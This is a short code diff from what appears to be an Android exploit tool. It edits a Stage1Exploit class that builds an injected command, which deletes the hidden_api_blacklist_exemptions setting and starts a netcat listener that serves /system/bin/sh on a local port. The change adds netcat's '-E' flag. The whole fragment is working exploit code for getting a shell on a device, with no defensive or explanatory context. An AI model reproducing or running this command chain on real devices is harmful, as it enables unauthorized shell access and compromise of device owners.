@@ -244,7 +244,7 @@ class Stage1Exploit:
 
         netcat_command = self.find_netcat_command()
         parsed_netcat_command = shlex.join(netcat_command)
-        command = f"(settings delete global hidden_api_blacklist_exemptions;{parsed_netcat_command} -s 127.0.0.1 -p " + str(self._port) + " -L /system/bin/sh)&"
+        command = f"(settings delete global hidden_api_blacklist_exemptions;{parsed_netcat_command} -s 127.0.0.1 -E -p " + str(self._port) + " -L /system/bin/sh)&"
         exploit_value = self.generate_stage1_exploit(command, exploit_type)
         exploit_command = [
             "settings",
